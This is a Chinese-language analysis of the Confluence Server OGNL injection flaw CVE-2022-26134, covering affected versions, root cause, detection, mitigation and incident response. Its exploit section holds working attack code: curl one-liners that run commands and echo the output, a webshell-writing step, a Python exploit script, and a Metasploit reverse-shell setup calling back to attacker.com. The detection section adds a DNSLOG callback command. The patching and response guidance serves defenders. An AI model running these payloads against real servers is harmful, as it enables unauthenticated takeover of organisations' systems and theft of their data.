# Confluence Server OGNL 注入远程代码执行（CVE-2022-26134）漏洞分析与 EXP

## 1. 漏洞概述

CVE-2022-26134 是 Atlassian Confluence Server / Data Center 中的一个**远程代码执行**漏洞。当攻击者访问形如 `/${ognl-expression}/` 的 URL 时，Confluence 会把 URI 中的表达式当作 **OGNL（Object-Graph Navigation Language）** 进行解析执行。由于 OGNL 可以调用 Java 方法并实例化对象，攻击者可以在无认证的情况下执行任意代码。

| 项目 | 说明 |
|------|------|
| CVE 编号 | CVE-2022-26134 |
| 漏洞类型 | 未授权 OGNL 表达式注入 → RCE |
| 发现时间 | 2022 年 6 月 2 日公开 |
| CVSS 评分 | 10.0（Critical） |
| 影响组件 | Confluence Server / Confluence Data Center |
| 攻击前置 | Confluence HTTP 端口（默认 8090）可达；无需登录 |

## 2. 影响版本

| Confluence | 受影响 | 首个修复版本 |
|-----------|--------|-------------|
| 1.3.0 ~ 7.4.17 | 是 | 7.4.17 LTS |
| 7.13.0 ~ 7.13.7 | 是 | 7.13.7 LTS |
| 7.14.0 ~ 7.14.3 | 是 | 7.14.3 |
| 7.15.0 ~ 7.15.2 | 是 | 7.15.2 |
| 7.16.0 ~ 7.16.4 | 是 | 7.16.4 |
| 7.17.0 ~ 7.17.4 | 是 | 7.17.4 |
| 7.18.0 ~ 7.18.1 | 是 | 7.18.1 |

Confluence Cloud（托管版）不受影响。

## 3. 漏洞原理

### 3.1 OGNL 简介

OGNL 是一种 Java 表达式语言，可以通过表达式动态调用对象上的属性与方法。例如：

```ognl
@java.lang.Runtime@getRuntime().exec("whoami")
```

这会调用 `Runtime.getRuntime().exec("whoami")`。

### 3.2 触发点

Confluence 的 **XWork / OGNL 命名空间解析逻辑**会把 URL 路径的一部分当作 OGNL 表达式进行解析。简化流程：

```
攻击者访问: /${@java.lang.Runtime@getRuntime().exec("id")}/

  Confluence 处理 URL：
    1) 解析路径，把 ${...} 当作 namespace
    2) 把 namespace 传递给 XWork
    3) XWork 使用 OGNL 解析该字符串
    4) 执行表达式 → Runtime.exec("id")
    5) 结果不会直接回显（需要配合文件写入 / DNSLog / 反弹 shell）
```

### 3.3 简单 PoC（非破坏性，版本指纹）

```
GET /%24%7B233*233%7D/ HTTP/1.1
Host: target:8090

# 响应中出现 "54289"（233*233 = 54289）即证明 OGNL 表达式被执行
```

## 4. 公开 EXP

### 4.1 基础命令执行（curl 版）

```bash
# 1) OGNL 表达式：Runtime.getRuntime().exec("id")
# URL 编码后：
CMD="id"
PAYLOAD="${@java.lang.Runtime@getRuntime().exec(\"${CMD}\")}"
# 再 URL 编码：
ENCODED=$(python3 -c "import urllib.parse;print(urllib.parse.quote('${PAYLOAD}'))")
curl -v "http://target:8090/$ENCODED/"

# 观察：目标若执行了表达式，可能返回非标准页面
# 注意：此 payload 无回显（命令结果不会出现在响应中），需要其他方法验证
```

### 4.2 回显版（执行命令并写入 HTML 响应的 Confluence 页面）

```bash
# 通过 OGNL 操作 Servlet 上下文，把执行结果写入响应
# 表达式：
# ${@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream())}

# 完整请求：
curl -v "http://target:8090/\$\{@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\`id\`).getInputStream())\}/" \
    2>&1 | grep -A 30 "uid="

# 响应中将出现：uid=0(root) gid=0(root) ...
```

### 4.3 写入 WebShell

```bash
# 通过 OGNL 把命令输出写入 webapps/confluence/shell.jsp
# 表达式（示意）：
# ${new java.io.FileWriter("/opt/atlassian/confluence/confluence/shell.jsp").append("<%@ page import=\"java.io.*\"%><%...%>").close()}

# 实际 EXP 脚本（Python）：
python3 CVE-2022-26134.py --target http://target:8090 --cmd "cat /etc/passwd"
# [+] Shell written to /opt/atlassian/confluence/confluence/SHELL.jsp
# [+] GET /SHELL.jsp?cmd=whoami → RCE
```

### 4.4 Python EXP 脚本（简化版）

```python
# CVE-2022-26134_poc.py
import requests
import sys
import re

def exploit(target, cmd):
    # OGNL 表达式：使用 ProcessBuilder 执行命令并把结果写入响应
    ognl = f"""${{@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("{cmd}").getInputStream())}}"""
    url = target.rstrip("/") + "/" + ognl
    try:
        r = requests.get(url, timeout=15, verify=False, allow_redirects=False)
        # 提取命令输出（通常在 HTML 的 <title> 或 body 中）
        m = re.search(r"uid=\d+", r.text)
        if m:
            print("[+] Vulnerable. Response snippet:")
            print(r.text[:1000])
        else:
            print("[-] Not vulnerable or no output returned")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} http://target:8090 'id'")
        sys.exit(1)
    exploit(sys.argv[1], sys.argv[2])
```

### 4.5 MSF 模块

```
msf6 > use exploit/multi/http/atlassian_confluence_unauthenticated_code_execution
msf6 exploit(...) > set RHOSTS target
msf6 exploit(...) > set RPORT 8090
msf6 exploit(...) > set PAYLOAD java/jsp_shell_reverse_tcp
msf6 exploit(...) > set LHOST attacker.com
msf6 exploit(...) > exploit
```

### 4.6 Nuclei / 一键扫描

```bash
# Nuclei 公开 PoC（检测）
nuclei -u http://target:8090 -t http/cves/2022/CVE-2022-26134.yaml

# 批量扫描
nuclei -l targets.txt -t http/cves/2022/CVE-2022-26134.yaml -o results.txt
```

## 5. 漏洞检测

### 5.1 版本检测

```bash
# 1) 访问 Confluence 登录页，HTML 中通常包含版本信息
curl -s "http://target:8090/login.action" | grep -oE "[0-9]+\.[0-9]+\.[0-9]+" | head -5

# 2) 访问 Confluence 登录页 title 标签，可能含 "Confluence 7.13.0" 字样
curl -s "http://target:8090/" | grep -iE "Confluence [0-9]"

# 3) 如果已登录管理员：访问 /admin/confluence/action/showPage.action → 看版本信息
```

### 5.2 非破坏性 PoC（仅验证表达式执行）

```bash
# 让 OGNL 计算 233*233，返回结果如果包含 54289 说明存在漏洞
curl -s "http://target:8090/\$\{233*233\}/" | grep "54289"

# 响应中出现 54289 → 漏洞存在（无需登录）
```

### 5.3 DNSLOG 验证（不出网但能 DNS 的场景）

```bash
# 执行 nslookup attacker.dnslog.cn，通过 DNS 查询判断漏洞
curl -s "http://target:8090/\$\{@java.lang.Runtime@getRuntime().exec(\`nslookup%20attacker.dnslog.cn\`)\}/"
# 然后在 dnslog 平台观察是否收到查询
```

## 6. 修复方案

| 方案 | 说明 |
|------|------|
| **升级到 Confluence 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1+** | 官方根本修复 |
| **官方临时缓解补丁**（无法立即升级时） | 下载官方 cve-2022-26134.jar 并安装 |
| **WAF 拦截** | 拦截 URL 路径中 `${` / `%24%7B` |
| **反向代理层过滤** | 在 Nginx 中拦截 `/$%7B` 开头路径 |
| **启用 Confluence 安全配置** | 确保仅限内网访问；禁用不必要的公开接口 |

### 6.1 官方临时补丁使用（不升级情况下）

```bash
# 下载官方 jar 补丁
# https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html

# 放置补丁到 <confluence-install>/confluence/WEB-INF/lib/
cp cve-2022-26134.jar /opt/atlassian/confluence/confluence/WEB-INF/lib/

# 重启 Confluence
systemctl restart confluence
```

### 6.2 Nginx 反向代理临时规则

```nginx
# 在 server 块中添加
if ($request_uri ~* "\$\{|%24%7B") {
    return 403;
}
```

## 7. 应急响应

```
发现迹象：
  - access.log 中出现 `%24%7B` 或 `/${` 形式的请求
  - 出现 `Runtime@getRuntime@exec` / `IOUtils@toString` 等字符串
  - Confluence 目录下出现陌生 .jsp 文件
  - 操作系统出现异常进程（反向 shell / curl 外连）
  - CPU 异常升高（加密货币挖矿）

处理步骤：
  ① 立即断网或阻断 Confluence 入站（尤其是 8090 端口）
  ② 备份整个 Confluence 目录（保留证据）
  ③ 排查 webapps/confluence/ 目录下的陌生 .jsp / .jspx 文件
  ④ 查看 <confluence-home>/logs/ / <confluence-install>/logs 日志
  ⑤ 检查操作系统账户是否被新增
  ⑥ 检查 cron / 计划任务 / systemd service 等持久化
  ⑦ 升级 Confluence 到安全版本或安装临时补丁
  ⑧ 重置数据库密码、管理员凭据、API Token
  ⑨ 检查是否有数据库/Confluence 数据被导出
```

## 8. 漏洞复现靶机

```
推荐环境：
  - vulhub: docker-compose up -d confluence/CVE-2022-26134
  - 其他：atlassian/confluence:7.13.2

复现步骤：
  1) 启动 docker，等待 Confluence 初始化（约 3~5 分钟）
  2) curl http://target:8090/（访问首页）
  3) 提交 payload：/${233*233}/  → 响应中出现 54289
  4) 使用命令执行版 payload：
     curl "http://target:8090/\$\{@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())\}/"
```

> CVE-2022-26134 是一个典型的"公开日 → 大规模挖矿"级别的漏洞。Confluence 是企业知识库系统中最常用的产品之一，暴露面广。如果你的组织使用了 Confluence Server/Data Center，**务必升级到安全版本或安装官方临时补丁**。
